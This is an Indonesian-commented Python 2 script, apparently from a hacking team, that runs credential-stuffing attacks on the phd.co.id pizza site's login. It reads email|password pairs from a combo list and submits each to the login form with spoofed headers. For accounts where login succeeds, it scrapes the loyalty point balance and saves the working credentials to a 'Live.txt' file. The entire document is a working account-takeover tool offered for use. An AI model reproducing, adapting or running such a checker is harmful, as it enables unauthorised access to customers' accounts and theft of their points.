#!/usr/bin/python2

# Creator :  Arianda
# Team : Manusia Biasa Team
# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode :3

# - - - Panduan - - - 
# Ubah Empas.txt ( $ nano Empas.txt ) Dengan Username & Password Yang Kalian Mau Cek. Kasih Pembatas "|" Antara Username Dengan Password, Contoh : user@gmail.com|password123.

from bs4 import BeautifulSoup as Bs
from mechanize import Browser
from time import sleep
import mechanize, cookielib, requests, sys, os

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

def banner():
	print(''+C+'''
   ___ _           _             ___ _  _ ___  
  / __| |_  ___ __| |_____ _ _  | _ \ || |   \ 
 | (__| ' \/ -_) _| / / -_) '_| |  _/ __ | |) |
  \___|_||_\___\__|_\_\___|_|   |_| |_||_|___/ 
          '''+W+'Creator : Arianda\n\t   Manusia Biasa Team')
                   
def main():
	live = []
	
	os.system('clear')
	
	banner()
	print
	print
	try:
		empas = raw_input(''+C+'Masukkan File'+W+' ('+H+' Ex :'+C+' Empas.txt'+W+') : ')
		print
		print(''+C+'-------------- '+W+'Starting'+C+' --------------')
		print
		a = open(empas).readlines()
		
		for x in a:
			
			br = Browser()
			cokie = cookielib.LWPCookieJar()
			br.set_handle_equiv(True)
			br.set_handle_gzip(True)
			br.set_handle_redirect(True)
			br.set_handle_referer(True)
			br.set_handle_robots(False)
			br.set_cookiejar(cokie)
			
			br.addheaders = [
			
			("Origin", "https://www.phd.co.id"),
			("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10"),
			("Referer", "https://www.phd.co.id/en/users/login/1"),
			("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
			
			]
			
			us = x.strip().split('|')[0]
			ps = x.strip().split('|')[1]
			
			url = 'https://www.phd.co.id/en/users/login/1'
			
			br.open(url)
			br.select_form(nr=0)
			br.form['username']=str(us)
			br.form['password']=str(ps)
			
			a = live
			
			if br.submit().geturl() == 'https://www.phd.co.id/en/users/welcome':
				x = br.open('https://www.phd.co.id/en/accounts').read()
				y = Bs(x,'html.parser')
				z = y.find('li', {'class' : 'owner-poin'}).text
				
				print(''+H+'['+W+'LIVE'+H+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps)+W+' POIN : '+str(z[6:]))
				a.append('[ LIVE ] [ USER : '+str(us)+' | PASS : '+str(ps)+' ] [ POIN : '+str(z[6:])+' ] Checked On https://github.com/Fukur0-3XP/PHD')
			
			else:
				print(''+A+'['+W+'ERROR'+A+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps))
		
		b = ('\n'.join(live))
		c = open('Live.txt','w')
		c.write(b)
		print
		print(''+C+'----------- '+W+'Selesai & Hasil'+C+' -----------')
		print
		print(W+'Hasil Live : '+C+str(len(live)))
		print(W+'Hasil Tersimpan Di File "'+C+'Live.txt'+W+'"') 
		print
		c.close()
	
	except IOError:
		print
		print(M+'File Tidak Di Temukan !')
		print
	
if __name__ == '__main__':
	main()
